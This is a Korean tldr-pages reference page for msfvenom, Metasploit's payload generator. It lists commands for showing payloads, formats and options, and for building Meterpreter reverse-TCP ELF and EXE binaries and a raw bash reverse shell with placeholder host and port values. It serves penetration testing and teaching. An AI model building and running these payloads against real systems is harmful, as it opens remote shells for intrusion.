---
layout: page
title: common/msfvenom (한국어)
description: "Metasploit의 페이로드를 수동으로 생성."
content_hash: d7b5d1ca9f4839daf784edaa57bedc77141ea02e
last_modified_at: 2024-11-08
related_topics:
  - title: English version
    url: /en/common/msfvenom.html
    icon: bi bi-globe
tldri18n_status: 2
---
# msfvenom

Metasploit의 페이로드를 수동으로 생성.
더 많은 정보: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- 페이로드 목록 표시:

`msfvenom -l payloads`

- 형식 목록 표시:

`msfvenom -l formats`

- 페이로드 옵션 표시:

`msfvenom -p `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">페이로드</span>` --list-options`

- 역방향 TCP 핸들러로 ELF 바이너리 생성:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_IP</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_포트</span>` -f elf -o `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">경로/대상/바이너리</span>

- 역방향 TCP 핸들러로 EXE 바이너리 생성:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_IP</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_포트</span>` -f exe -o `<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">경로/대상/바이너리.exe</span>

- 역방향 TCP 핸들러로 원시 Bash 생성:

`msfvenom -p cmd/unix/reverse_bash LHOST=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_IP</span>` LPORT=`<span class="tldr-var badge badge-pill bg-dark-lm bg-white-dm text-white-lm text-dark-dm font-weight-bold">로컬_포트</span>` -f raw`
